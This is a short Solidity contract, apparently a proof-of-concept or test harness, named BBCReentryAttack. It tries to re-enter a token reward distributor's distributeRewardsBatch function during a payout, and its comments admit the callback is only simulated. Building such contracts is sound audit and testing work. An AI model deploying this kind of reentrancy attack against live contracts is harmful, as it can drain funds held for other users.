// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IBBCRewardDistributor {
    function distributeRewardsBatch(uint256 offset, uint256 batchSize) external;
}

interface IBBC is IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BBCReentryAttack {
    IBBCRewardDistributor public distributor;
    IBBC public bbc;
    bool public hasAttacked;

    constructor(address _distributor, address _bbcToken) {
        distributor = IBBCRewardDistributor(_distributor);
        bbc = IBBC(_bbcToken);
    }

    function attack() external {
        hasAttacked = false;
        distributor.distributeRewardsBatch(0, 1);
    }

    function reenter() external {
        if (!hasAttacked) {
            hasAttacked = true;
            distributor.distributeRewardsBatch(0, 1);
        }
    }

    // Simulates the recipient being called during reward transfer
    function triggerReward() external {
        // The idea is that distributor does something like:
        // recipient.reenter() during reward distribution
        this.reenter();
    }

    receive() external payable {}
}
